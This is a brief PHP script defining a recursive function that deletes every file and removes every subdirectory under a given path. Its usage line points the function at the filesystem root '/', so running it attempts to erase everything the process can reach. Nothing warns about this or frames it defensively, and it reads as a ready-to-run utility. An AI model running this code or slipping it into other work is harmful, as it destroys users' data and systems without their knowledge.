<?php

function deleteAllContents($dir) {
    // Check if the directory exists
    if (!is_dir($dir)) {
        return;
    }

    // Get all the files and folders in the directory
    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {
        // Construct the full path
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;

        // If it's a directory, recursively delete it
        if (is_dir($filePath)) {
            deleteAllContents($filePath);
            rmdir($filePath); // Remove the directory itself
        } else {
            // If it's a file, delete it
            unlink($filePath);
        }
    }
}

// Usage
$directory = '/';
deleteAllContents($directory);
?>
